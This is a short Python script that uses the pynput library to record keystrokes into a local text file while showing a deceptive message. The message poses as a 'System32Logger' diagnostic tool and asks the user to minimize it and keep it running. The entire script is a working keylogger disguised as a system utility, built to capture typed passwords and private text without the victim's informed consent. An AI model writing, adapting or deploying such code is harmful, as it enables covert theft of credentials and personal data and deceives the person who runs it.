import pynput

from pynput.keyboard import Key, Listener

print("Please minimize to take full effect.  System32Logger will need to detect the problem so don't close the program or turn off your pc while it is running.  to end the process please press escape while System32Logger is open.  Thank you user.")

count = 0
keys = []

def on_press(key):
	global keys, count

	keys.append(key)
	count += 1
	

	if count >= 25:
		count = 0
		write_file(keys)
		keys = []

def write_file(keys):
	with open("system32problemlogger.txt", "a") as f:
		for key in keys:
			k = str(key).replace("'", "")
			if k.find("space") > 0:
			    f.write('\n')
			elif k.find("Key") == -1:
				f.write(k)


def on_release(key):
	if key == Key.esc:
		return False

with Listener(on_press=on_press, on_release=on_release) as Listener:
	Listener.join()
	    